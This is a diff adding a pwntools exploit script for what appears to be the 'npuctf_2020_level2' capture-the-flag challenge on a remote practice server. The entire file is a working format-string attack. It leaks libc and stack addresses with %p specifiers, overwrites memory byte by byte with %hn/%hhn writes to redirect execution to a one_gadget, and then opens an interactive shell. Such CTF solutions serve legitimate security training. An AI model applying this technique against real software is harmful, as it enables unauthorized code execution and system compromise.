@@ -1,0 +1,41 @@
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+from pwn import *
+
+debug = 2
+context(arch="amd64", endian='el', os="linux")
+context.log_level = "debug"
+if debug == 1:
+    p = process('./npuctf_2020_level2')
+else:
+    p = remote('node3.buuoj.cn',29741)
+libc = ELF('../../x64libc/libc.so.6', checksec=False)
+libc_one_gadget = [0x4f2c5, 0x4f322, 0x10a38c]
+
+p.sendline('%7$p')
+addr___libc_start_main = int(p.recv(14), 16) - 231
+libcbase = addr___libc_start_main - libc.sym['__libc_start_main']
+addr___malloc_hook = libcbase + libc.sym['__malloc_hook']
+addr_one_gadget = libcbase + libc_one_gadget[0]
+
+sleep(1)
+p.recv()
+p.sendline('%9$p')
+addr_stack = int(p.recv(14), 16) - 0xe0
+
+
+stackbase = addr_stack & 0xffff
+p.sendlineafter('\n', '%' + str(stackbase) + 'c%9$hn\x00')
+p.sendlineafter('\x20\x20\xb4', '%' + str(addr_one_gadget & 0xff) + 'c%35$hhn\x00')
+p.sendlineafter('\x20\x20\xb4', '%' + str(stackbase + 1) + 'c%9$hhn\x00')
+p.sendlineafter('\x20\x20\xb4', '%' + str(addr_one_gadget >> 8 & 0xff) + 'c%35$hhn\x00')
+p.sendlineafter('\x20\x20\xb4', '%' + str(stackbase + 2) + 'c%9$hhn\x00')
+# gdb.attach(p, "b *$rebase(0x81F)\nb *$rebase(0x826)\nc\nc")
+p.sendlineafter('\x20\x20\xb4', '%' + str(addr_one_gadget >> 16 & 0xff) + 'c%35$hhn\x00')
+p.sendline('66666666\x00')
+p.recv()
+success('addr_one_gadget        = ' + hex(addr_one_gadget))
+success('stackbase              = ' + hex(stackbase))
+success('addr_stack             = ' + hex(addr_stack))
+success('addr___libc_start_main = ' + hex(addr___libc_start_main))
+p.interactive()
